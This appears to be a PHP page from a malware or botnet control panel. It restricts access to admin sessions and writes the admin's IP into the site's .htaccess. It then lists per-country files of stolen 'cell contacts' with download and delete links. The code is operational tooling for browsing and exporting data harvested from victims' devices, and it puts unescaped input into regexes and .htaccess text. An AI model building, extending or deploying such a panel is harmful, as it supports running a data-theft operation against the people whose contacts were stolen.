<?php
$statusCode=false;
if (!(isset($_SESSION['panel_user'])))
{
	session_destroy();
	header("Location: /index.php");
}else{

	if ($_SESSION['panel_status']!="Action"){
		session_destroy();
		header("Location: /index.php");
	}

	if ($_SESSION['panel_right']!="admin"){
		header("Location: /index.php");
	}else{
		$statusCode=true;
	}
}
if($statusCode){
?>

<div class="content" style="padding-top:15px;">
 <table class="table table-hover table_dark" id="bootstrap-table">
 <thead class="header_table_bots">
		<th><a title="Country"><img src="images/icons/table/Country.png" width='25px'/></a></th>
		<th>Count</th>
		<th><a title="Country"><img src="images/icons/table/icloud.png" width='25px'/></a></th>
	</thead>

<?php

$getIP = $_SERVER['REMOTE_ADDR'];

$textFile = rFile("../.htaccess");

if (!preg_match("/$getIP/",$textFile)){
$getSession = $_SESSION['panel_user'];
$textSession="!!!login!!!$getSession";

	if (preg_match("/$textSession/",$textFile)){
		preg_match_all("#$textSession(.+?)endlogin$getSession#is", $textFile, $arr);
		$getDate = $arr[0][0];
		$saveTextFile = str_replace("#$getDate","#!!!login!!!$getSession\nAllow from $getIP\n#***endlogin$getSession",$textFile);
		file_put_contents("../.htaccess", $saveTextFile, LOCK_EX);
	}else{
		$saveTextFile = str_replace("#!!!access html!!!","#!!!access html!!!\n#!!!login!!!$getSession\nAllow from $getIP\n#***endlogin$getSession",$textFile);
		file_put_contents("../.htaccess", $saveTextFile, LOCK_EX);
	}
}

$svoy=getcwd();
$godir="/application/datalogs/numers";

$dir = "$svoy$godir";
$files2 = scandir($dir, 1);
echo "<p id='text_command' style='margin-top:5px; Color:#EDB749;  font-size: 13pt;'>Cell contacts</p>";
foreach($files2 as $fil)
{
	if (preg_match("/.html/",$fil))
	{
		$nameF = str_replace(".html","","$fil");
		$path = "application/datalogs/numers/";
		$count = lines("application/datalogs/numers/$fil");
		$nameF_icon=str_replace("(","",$nameF);
		$nameF_icon=str_replace(")","",$nameF_icon);

		if (!file_exists("images/country/$nameF_icon.png")) {
			$nameF_icon="not";
		}

		echo "<tr class='table_bots' style='color: #A4A4A4'>
				<td><a title='$nameF'><img src='images/country/$nameF_icon.png' width='20px'/></a></td>
				<td>$count</td>
				<td><a href='$path$fil' download>Download</a> / <a href='application/set/deleteFile.php?t=nums&f=$nameF'>Delete</a></td>
				</tr>";
	}
}



?></div><?php
}

function lines($file)
{
    if(!file_exists($file))exit("Файл не найден");
    $file_arr = file($file);
    $lines = count($file_arr);
    return $lines;
}

function rFile($path)
{
	$file_handle = fopen($path, "r");

	$text = "";

	if ( is_resource($file_handle) ) {

		while (!feof($file_handle)) {
		   $line = fgets($file_handle);
		   $text="$text$line";
		}

		fclose($file_handle);

	}

	return $text;
}

?>
